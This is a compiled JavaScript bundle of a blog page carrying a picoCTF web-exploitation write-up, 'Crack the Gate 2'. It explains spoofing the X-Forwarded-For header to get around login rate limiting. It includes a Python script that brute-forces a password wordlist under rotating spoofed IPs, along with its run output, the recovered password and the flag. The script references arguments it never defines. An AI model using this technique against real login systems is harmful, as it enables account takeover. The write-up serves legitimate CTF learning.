"use strict";(self.webpackChunkmy_own_blog=self.webpackChunkmy_own_blog||[]).push([[9474],{28453:(e,r,t)=>{t.d(r,{R:()=>a,x:()=>o});var s=t(96540);const n={},i=s.createContext(n);function a(e){const r=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function o(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:a(e.components),s.createElement(i.Provider,{value:r},e.children)}},39434:(e,r,t)=>{t.d(r,{A:()=>s});const s=t.p+"assets/images/false-19273b3fe771d8dc34d01d676e8217b1.png"},64513:(e,r,t)=>{t.r(r),t.d(r,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"pico-ctf/web-exploitation/crack-the-gate-2/crack-the-gate-2","title":"Crack the Gate 2","description":"- Description: The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source.","source":"@site/docs/pico-ctf/web-exploitation/crack-the-gate-2/crack-the-gate-2.mdx","sourceDirName":"pico-ctf/web-exploitation/crack-the-gate-2","slug":"/pico-ctf/web-exploitation/crack-the-gate-2/","permalink":"/my-small-blog/docs/pico-ctf/web-exploitation/crack-the-gate-2/","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"picoMini by CMU-Africa","permalink":"/my-small-blog/docs/tags/picomini-by-cmu-africa","description":"picoMini by CMU-Africa tag description"}],"version":"current","frontMatter":{"tags":["picomini-by-cmu-africa"]},"sidebar":"tutorialSidebar","previous":{"title":"Crack the Gate 1","permalink":"/my-small-blog/docs/pico-ctf/web-exploitation/crack-the-gate-1/"},"next":{"title":"dont-use-client-side","permalink":"/my-small-blog/docs/pico-ctf/web-exploitation/dont-use-client-side"}}');var n=t(74848),i=t(28453);const a={tags:["picomini-by-cmu-africa"]},o="Crack the Gate 2",c={},d=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function l(e){const r={a:"a",blockquote:"blockquote",code:"code",em:"em",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(r.header,{children:(0,n.jsx)(r.h1,{id:"crack-the-gate-2",children:"Crack the Gate 2"})}),"\n",(0,n.jsxs)(r.ul,{children:["\n",(0,n.jsxs)(r.li,{children:[(0,n.jsx)(r.strong,{children:"Description:"})," The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source.\r\nWe've received a tip that the system might still trust user-controlled headers.\r\nYour objective is to bypass the rate-limiting restriction and log in using the known email address: ",(0,n.jsx)(r.a,{href:"mailto:ctf-player@picoctf.org",children:"ctf-player@picoctf.org"})," and uncover the hidden secret."]}),"\n"]}),"\n",(0,n.jsx)(r.hr,{}),"\n",(0,n.jsx)(r.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,n.jsxs)(r.p,{children:['This challenge was a common web CTF scenario: the target employed rate-limiting based on the request source", but trusted client-controlled headers (for example, ',(0,n.jsx)(r.code,{children:"X-Forwarded-For"}),").\r\nThe general idea to bypass the restriction was simple - perform each attempt appearing to originate from a different source by injecting a header value under our control."]}),"\n",(0,n.jsxs)(r.p,{children:["First, we needed to determine which header the server used to identify the source.\r\nTo test this, we added a header such as ",(0,n.jsx)(r.code,{children:"X-Forwarded-For: 1.2.3.4"})," and observed the server's response.\r\nThe reply differed from the baseline behavior."]}),"\n",(0,n.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,n.jsx)("img",{src:t(39434).A,style:{width:"100%",height:"auto"}})}),"\n",(0,n.jsxs)(r.p,{children:["When we retried requests using that same IP value, the server began blocking them, whereas requests using other IP values were allowed.\r\nFrom this behaviour we could infer that the server was relying on the ",(0,n.jsx)(r.code,{children:"X-Forwarded-For"})," value to identify and, if necessary, block a source."]}),"\n",(0,n.jsxs)(r.p,{children:["The task provided a small word list containing 20 possible passwords.\r\nThe objective became: brute-force those 20 passwords while presenting each password attempt as coming from a different IP address.\r\nOne obvious approach would be to use ",(0,n.jsx)(r.strong,{children:"Burp Suite Intruder"})," with a ",(0,n.jsx)(r.em,{children:"cluster-bomb attack"})," mode, pairing password candidates with varying ",(0,n.jsx)(r.code,{children:"X-Forwarded-For"})," values.\r\nHowever, because Intruder felt slow in this instance, I opted for a different method."]}),"\n",(0,n.jsxs)(r.p,{children:["I implemented a lightweight script to automate the process.\r\nThe script generated distinct IP values, issued POST requests to ",(0,n.jsx)(r.code,{children:"/login"})," with each password attempt and the corresponding injected header, and examined the responses.\r\nAny response containing the string ",(0,n.jsx)(r.strong,{children:"pico"})," was treated as a likely positive indicator (a possible flag-containing response)."]}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{className:"language-python",children:'#!/usr/bin/env python3\r\nimport argparse, requests, random, time, sys, json\r\n\r\ndef rand_ip():\r\n    return f"201.0.113.{random.randint(1,254)}"\r\n\r\ndef detect_success(resp, success_indicator, success_statuses):\r\n    if success_indicator and success_indicator in resp.text:\r\n        return True\r\n    if success_statuses and resp.status_code in success_statuses:\r\n        return True\r\n    if resp.status_code in (302,303):\r\n        return True\r\n    return False\r\n\r\ndef main():\r\n    p = argparse.ArgumentParser()\r\n    p.add_argument(\'--wordlist\', required=True)\r\n    p.add_argument(\'--url\', required=True, help=\'full login URL e.g. http://host:port/login\')\r\n    p.add_argument(\'--email\', required=True)\r\n    p.add_argument(\'--success-indicator\', default=None, help=\'string to look for on success (optional)\')\r\n    p.add_argument(\'--success-status\', type=int, nargs=\'*\', default=[], help=\'HTTP status code(s) considered success\')\r\n    args = p.parse_args()\r\n\r\n    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None\r\n    session = requests.Session()\r\n    session.verify = True\r\n\r\n    with open(args.wordlist, \'r\', encoding=\'utf-8\', errors=\'ignore\') as f:\r\n        passwords = [line.strip() for line in f if line.strip()]\r\n\r\n    print(f"[+] loaded {len(passwords)} passwords")\r\n\r\n    for i, pwd in enumerate(passwords, 1):\r\n        xff = rand_ip()\r\n        headers = {\r\n            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",\r\n            "Accept": "*/*",\r\n            "Content-Type": "application/json",\r\n            "Origin": "http://amiable-citadel.picoctf.net:55007/",\r\n            "Referer": "http://amiable-citadel.picoctf.net:55007/",\r\n            "X-Forwarded-For": xff,\r\n            "X-Real-IP": xff\r\n        }\r\n        payload = {"email": args.email, "password": pwd}\r\n        tries = 0\r\n        resp = None\r\n        while tries < args.max_retries:\r\n            tries += 1\r\n            try:\r\n                resp = session.post(args.url, headers=headers, data=json.dumps(payload), proxies=proxies, timeout=15, allow_redirects=False)\r\n                break\r\n            except Exception as e:\r\n                print(f"[!] network error (try {tries}) for pwd=\'{pwd}\': {e}")\r\n                time.sleep(1)\r\n        if resp is None:\r\n            continue\r\n\r\n        print(f"[{i}/{len(passwords)}] pwd=\'{pwd}\' XFF={xff} -> status={resp.status_code} len={len(resp.text)}")\r\n\r\n        if detect_success(resp, args.success_indicator, args.success_status):\r\n            print("=== POSSIBLE SUCCESS ===")\r\n            print("Password:", pwd)\r\n            print("X-Forwarded-For:", xff)\r\n            print("Status:", resp.status_code)\r\n            print("Response snippet:\\n", resp.text[:2000])\r\n            return\r\n\r\n        time.sleep(args.delay)\r\n\r\n    print("[*] done. no success detected.")\r\n\r\nif __name__ == "__main__":\r\n    main()\n'})}),"\n",(0,n.jsxs)(r.p,{children:["The experiment succeeded: the correct password turned out to be ",(0,n.jsx)(r.code,{children:"X68f2Ftm"}),", and from the resulting response we recovered the flag."]}),"\n",(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{children:'> python script.py --wordlist passwords.txt --url "http://amiable-citadel.picoctf.net:55007/login" --email ctf-player@picoctf.org --success-indicator "pico"\r\n[+] loaded 20 passwords\r\n[1/20] pwd=\'H3ZdQe9D\' XFF=201.0.113.211 -> status=200 len=17\r\n[2/20] pwd=\'4s8RNXkB\' XFF=201.0.113.134 -> status=200 len=17\r\n[3/20] pwd=\'G9YKC9r1\' XFF=201.0.113.12 -> status=200 len=17\r\n[4/20] pwd=\'J49Q5uuo\' XFF=201.0.113.205 -> status=200 len=17\r\n[5/20] pwd=\'ZARenM3b\' XFF=201.0.113.27 -> status=200 len=17\r\n[6/20] pwd=\'X68f2Ftm\' XFF=201.0.113.43 -> status=200 len=132\r\n=== POSSIBLE SUCCESS ===\r\nPassword: X68f2Ftm\r\nX-Forwarded-For: 201.0.113.43\r\nStatus: 200\r\nResponse snippet:\r\n {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{xff_byp4ss_brut3_3477bf15}"}\n'})}),"\n",(0,n.jsx)(r.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,n.jsxs)(r.blockquote,{children:["\n",(0,n.jsx)(r.p,{children:(0,n.jsx)(r.code,{children:"picoCTF{xff_byp4ss_brut3_3477bf15}"})}),"\n"]})]})}function p(e={}){const{wrapper:r}={...(0,i.R)(),...e.components};return r?(0,n.jsx)(r,{...e,children:(0,n.jsx)(l,{...e})}):l(e)}}}]);